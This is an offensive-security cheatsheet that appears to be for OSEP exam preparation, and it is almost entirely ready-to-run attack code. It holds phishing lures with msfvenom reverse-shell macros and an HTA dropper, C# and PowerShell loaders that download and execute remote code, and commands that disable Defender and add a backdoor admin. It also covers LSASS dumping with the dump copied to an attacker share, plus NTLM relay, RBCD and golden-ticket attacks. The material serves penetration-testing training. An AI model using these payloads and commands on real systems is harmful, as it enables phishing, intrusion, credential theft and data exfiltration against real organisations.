# OSEP Cheatsheet 

---


## Initial Access — Phishing

### Office VBA Macro (x86)

> **Scenario**: Send a Word CV with an obfuscated VBA macro. On enable, shellcode executes and beacons back.

**Method A — BadAssMacro**

```bash
# Generate shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8090 EXITFUNC=thread -f raw -o shellcode.bin

# Produce obfuscated VBA (BadAssMacro)
BadassMacrox86.exe -i shellcode.bin -s indirect -p no -w doc -o output.txt

# Start listener
sudo msfconsole -q -x "use multi/handler; set payload windows/shell_reverse_tcp; set lhost tun0; set lport 8090; exploit"

# Send email with attachment (example)
sendEmail -f bob@xyz.com -t alice@xyz.com -u "Reports" -m "My Reports" -a Final.doc -s <HTTP_HOST> -v
```

**Method B — VBA Shellcode Runner**

Runner template: [shellcodeRunner.vba](https://raw.githubusercontent.com/Extravenger/OSEPlayground/refs/heads/main/02%20-%20Macros/shellcodeRunner.vba)

```bash
# Example: XOR‑encrypted Meterpreter shellcode inline for VBA
msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread \
  -f vbapplication --encrypt xor --encrypt-key a
```

In VBA, size the buffer larger than the shellcode:

```vb
Dim buf(X) As Byte
```

---

### HTA Delivery

> **Scenario**: A user reports an ERP glitch; you reply with a link to an **HTA** that pulls and runs staged components.

**0) Files & Artifacts**

* `file.hta` (JScript) → downloads `bypass.exe` then runs `InstallUtil.exe /U`.
* `Bypass.exe` (C# Installer class) → on uninstall, downloads & executes `run.txt`.
* `run.txt` (PowerShell) → loader (e.g., Process Hollowing).

**1) Stage files on web root** (e.g., `http://<HTTP_HOST>/`)
Place `file.hta`, `bypass.exe`, `run.txt` on the same host.

**2) (Optional) Prepare listener/C2**
If `run.txt` calls back, bring the listener up before delivery.

**3) Deliver the lure (email with HTA link)**

```bash
swaks --body 'Issues with the ERP system:  http://<HTTP_HOST>/file.hta' \
  --add-header "Really: 1.0" \
  --add-header "Content-Type: text/html" \
  --header "Subject: Important" \
  -t bob@xyz.com -f alice@xyz.com --server <HTTP_HOST>
```

**Snippets**

`file.hta`

```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var cmd = "cmd.exe /c bitsadmin /transfer job /download /priority high http://<HTTP_HOST>/bypass.exe C:\\Windows\\Tasks\\warhead.exe & C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\warhead.exe";
var res = shell.Run(cmd, 0, true);
</script>
</head>
<body>
<script language="JScript">self.close();</script>
</body>
</html>
```

`Bypass.exe` (C# Installer)

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary.");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://<HTTP_HOST>/run.txt') | IEX";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

[run.txt](https://raw.githubusercontent.com/Extravenger/OSEPlayground/refs/heads/main/07%20-%20Powershell%20Scripts/03%20-%20Loaders/procHollow.ps1)
PowerShell loader (e.g., Process Hollowing) — keep your script server‑side and version‑controlled.

---

## Post‑Exploitation

### Quick PrivEsc (SeImpersonate)

```bash
meterpreter > getsystem -t 5
```

### Defense Evasion & RDP

> **Run as SYSTEM** when applicable.

```powershell
NetSh Advfirewall set allprofiles state off

"C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
Add-MpPreference -ExclusionPath %SystemRoot%\Tasks
Add-MpPreference -ExclusionExtension '.exe'
```

Enable RDP & create local admin (scripted):

```powershell
# https://raw.githubusercontent.com/n000b3r/PrivEsc/refs/heads/main/Windows/post_scripts/post_admin.ps1

IEX(New-Object Net.WebClient).DownloadString("http://<HTTP_HOST>/post_admin.ps1")
```

From attacker:

```bash
rdesktop <VICTIM_IP> -u "bill" -p "P@ssw0rd123!" -g 100% -x 0x80
```

### Host & AD Recon

```powershell
# Quick tree of user profiles
cmd /c "tree /A /F C:\Users"

# Seatbelt (full sweep)
.\Seatbelt.exe -group=all -outputfile="C:\windows\tasks\seatbelt.txt"

# Host recon
IEX(New-Object Net.WebClient).DownloadString("http://<ATTACKER_IP>/HostRecon.ps1")
Invoke-HostRecon | Out-File C:\windows\tasks\HostRecon.txt

# ADPEAS
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/adPEAS.ps1')
Invoke-adPEAS -Domain '<DOMAIN>' -Outputfile 'C:\windows\tasks\adPEAS.txt' -NoColor

# Move artifacts to SMB share
net use \\<ATTACKER_IP>\share /u:kali kali
copy C:\windows\tasks\*.zip \\<ATTACKER_IP>\share\temp\
copy C:\windows\tasks\*.txt \\<ATTACKER_IP>\share\temp\

# SharpHound (PowerShell variant)
IEX(New-Object Net.WebClient).DownloadString("http://<ATTACKER_IP>/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All -SearchForest
```

### Scheduled Tasks

```bash
schtasks /query /tn "mail" /fo LIST /v
```

### Tunneling (Ligolo)

```bash
# Start server
sudo ligolo-mp

# Generate agent payload
donut -f 1 -o agent.bin -a 2 -p "-connect <ATTACKER_IP>:11601 -ignore-cert" -i agent.exe

# PowerShell runner
# (host your ligolo-psrunner.ps1 and pull it at runtime)
IEX(iwr http://<ATTACKER_IP>/ligolo.ps1 -UseBasicParsing)
# Add routes & start relay as needed
```

---

## Lateral Movement & Remote Exec

### NTLM Relay (SQL pivot example)

```bash
# Connect to SQL and prep payload
impacket-mssqlclient <USER>@<VICTIM_IP> -windows-auth
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\'http://<ATTACKER_IP>/run.txt\') | IEX'.encode('utf-16le')).decode())"

# Relay to target and execute
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -enc <BASE64_PAYLOAD>'

# Trigger via xp_dirtree
xp_dirtree \\<ATTACKER_IP)\\share\\
```

### Impacket toolbelt

```bash
# WMI Exec (hashes or tickets)
impacket-wmiexec -hashes :<HASH> <USER>@<VICTIM_IP>

# Secretsdump
impacket-secretsdump -hashes :<HASH> <USER>@<DC_IP>

# PsExec (various auth modes)
impacket-psexec -k -no-pass <TARGET_FQDN>
impacket-psexec -hashes :<HASH> <USER>@<VICTIM_IP>
```

### Evil‑WinRM

```bash
evil-winrm -i <VICTIM_IP> -u <DOMAIN\\USER> -H <HASH>
```

### MSSQL Linked Servers & xp\_cmdshell

```sql
EXECUTE as LOGIN = 'sa';
EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXEC ('sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;') AT SQL03;
EXEC('xp_cmdshell "whoami"') AT SQL03;
```

### Port Forwarding (Windows)

```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80  connectaddress=<ATTACKER_IP>
netsh interface portproxy add v4tov4 listenport=9090 listenaddress=0.0.0.0 connectport=9090 connectaddress=<ATTACKER_IP>
netsh interface portproxy add v4tov4 listenport=8089 listenaddress=0.0.0.0 connectport=443 connectaddress=<ATTACKER_IP>
```

---

## Credential Access & PPL

```powershell
# Check PPL state
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"

# Load driver & unprotect LSASS, then dump
net use \\<ATTACKER_IP>\share /u:kali kali
copy \\<ATTACKER_IP>\share\temp\mimidrv.sys .
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-Mimikatz2.ps1')
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::ekeys"'

# Minidump & exfil
curl -o MiniDump.exe http://<ATTACKER_IP>/MiniDump.exe
./MiniDump.exe
copy lsass.dmp \\<ATTACKER_IP>\share\temp\

# Offline parse
pypykatz lsa minidump lsass.dmp
```

---

## Kerberos & AD Attacks

### Kerberoasting (quick path)

```bash
# Identify SPN users then request TGS
impacket-GetUserSPNs <DOMAIN>/<USER> -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt
```

### WriteDACL (grant rights to a group/object)

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView.ps1')
Add-DomainObjectAcl -TargetIdentity <GROUP_OR_OBJECT> -PrincipalIdentity <USER_OR_SVC> -Rights All
net group <GROUP_OR_OBJECT> <USER_OR_SVC> /add /domain
```

### RBCD (Resource‑Based Constrained Delegation)

```powershell
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force); Get-DomainComputer -Identity myComputer
$sid = Get-DomainComputer -Identity myComputer | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"; $SDbytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity JUMP09 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

$RBCDbytes = Get-DomainComputer JUMP09 | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0; $Descriptor.DiscretionaryAcl
./rubeus.exe hash /password:h4x

# S4U → CIFS ticket, apply, access
.\rubeus.exe s4u /user:myComputer$ /rc4:<RC4_HASH> /impersonateuser:administrator /msdsspn:CIFS/JUMP09.LAB.LOCAL /ptt /outfile:C:\windows\tasks\kirbi.txt /nowrap
klist
ls \\JUMP09.LAB.LOCAL\c$
.\PsExec64.exe -accepteula \\JUMP09.LAB.LOCAL cmd
```

### Golden Ticket (example outline)

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:<KRBTGT_USER>"

# Get domain SIDs
IEX(New-Object Net.WebClient).DownloadString("http://<ATTACKER_IP>/PowerView.ps1")
Get-DomainSID -Domain <DOMAIN>

# Forge & inject
mimikatz.exe "kerberos::golden /user:h4x /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /ptt"
.\PsExec64.exe /accepteula \\<DC_HOST> cmd
```

---

## Key Material Handling

### Keytab

```bash
# Copy keytab then extract
scp -i ~/.ssh/id_rsa root@<VICTIM_IP>:/etc/krb5.keytab krb5.keytab
python3 keytabextract.py krb5.keytab
```

### CCache Ticket

```bash
# Copy & set
scp -i ~/.ssh/id_rsa <USER>@<VICTIM_IP>:/tmp/krb5cc_<ID> /tmp/krb5cc_<ID>
export KRB5CCNAME=/tmp/krb5cc_<ID>

# Kerberos client
sudo apt install -y krb5-user
# /etc/hosts → ensure DC & realm mapping

# SOCKS proxy via SSH
ssh -i ~/.ssh/id_rsa <USER>@<VICTIM_IP> -D 9050

# Alternative: sshuttle
sshuttle -v -e "ssh -i /home/kali/.ssh/id_rsa" -r root@<VICTIM_IP> <TARGET_SUBNET>/24
```

### Directory Enumeration (ticketed)

```bash
proxychains impacket-GetADUsers -all -k -no-pass -dc-ip <DC_IP> <DOMAIN>/<USER>
proxychains impacket-GetUserSPNs -k -no-pass -dc-ip <DC_IP> <DOMAIN>/<USER>
proxychains bloodhound-python -k -no-pass -u <USER> -ns <DC_IP> -d <DOMAIN> -c all --zip --dns-tcp
```

---

## Linux Payload (ELF)

```bash
sudo msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 \
  -e x64/xor_dynamic -i 8 -b "\x00" prependfork=true -t 300 -f elf -o /var/www/html/shell.elf
```

---

## References

* [Extravenger/OSEPlayground](https://github.com/Extravenger/OSEPlayground) — Curated OSEP lab snippets: macros/HTA delivery, tunneling, PowerShell loaders, recon helpers.
* [y4ng0615/osep-automate-payloads](https://github.com/y4ng0615/osep-automate-payloads) — Scripts to automate OSEP‑style payload generation and templates.
* [deo-gracias/cybersec](https://github.com/deo-gracias/cybersec) — Mixed cybersecurity notes/tools; good companion references (OSCP/OSEP adjacent).
* [n000b3r/OSCP-Notes](https://github.com/n000b3r/OSCP-Notes) — OSCP notes & command collections; solid foundations for privesc/recon.
* [chvancooten/OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets) — Ready‑made code snippets relevant to OSEP (EDR/AV evasion, loaders, etc.).

---